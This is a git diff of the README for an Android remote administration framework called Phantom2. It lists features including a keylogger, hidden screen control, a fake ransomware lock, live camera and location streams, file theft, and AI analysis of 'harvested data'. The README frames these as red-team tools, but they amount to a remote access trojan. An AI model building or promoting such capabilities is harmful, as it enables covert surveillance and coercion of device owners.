@@ -1,5 +1,5 @@
  HEAD
-# Phantom2
+# PHANTOM II
 
 **Open-source Android remote administration framework.**
 **NBM.**
@@ -9,7 +9,7 @@ cross-platform Electron control panel paired with a lightweight Android
 client. Use it for red-team engagements, lab research, and testing on devices
 you own.
 
-Phantom 3 and Phantom 4 are available with production-grade features and
+PHANTOM v3 , v4 and v5 are available with production-grade features and
 advanced capabilities. Phantom2 is the public, MIT-licensed baseline that
 anyone can clone, build, and extend.
 
@@ -36,20 +36,20 @@ Everything is MIT licensed. Everything is source-available.
 
 ---
 
-## Panel features
+## PANEL FEATURES
 
-- **Dashboard** — live stats, connected device count, activity feed
-- **Devices** — card + list views, per-device status, a11y + admin state, battery, carrier, country
-- **HVNC & Control** — live screen frames, UI tree overlay, hitboxes, tap, type, swipe, key codes, navigation
-- **Ransomware Lock** — timed device lock with fake encryption animation (no payment screen)
-- **AI Analysis** — Kimi/Moonshot-powered forensic reports over harvested data, streaming Markdown output
-- **Location** — live coordinates, accuracy, Google Maps embed
-- **Camera** — front + back live JPEG stream
-- **Files** — browse, list, pull files from the device
-- **Keylogger** — live keystroke stream
-- **Notifications** — live notification capture
-- **Apps Manager** — installed apps, open/kill actions
-- **Data** —
+- **Dashboard** 
+- **Devices** 
+- **HVNC & Control** 
+- **Ransomware Lock** 
+- **AI Analysis** 
+- **Location** 
+- **Camera** 
+- **Files** 
+- **Keylogger** 
+- **Notifications** 
+- **Apps Manager** 
+- **Data** 
 - **APK Builder** 
 - **System Logs**
 
@@ -87,6 +87,8 @@ Everything is MIT licensed. Everything is source-available.
 ---
 
 ## Quick Start
+  **env**
+  - READ  [.env.example](.env.example)
 
 ### 1. Clone
 
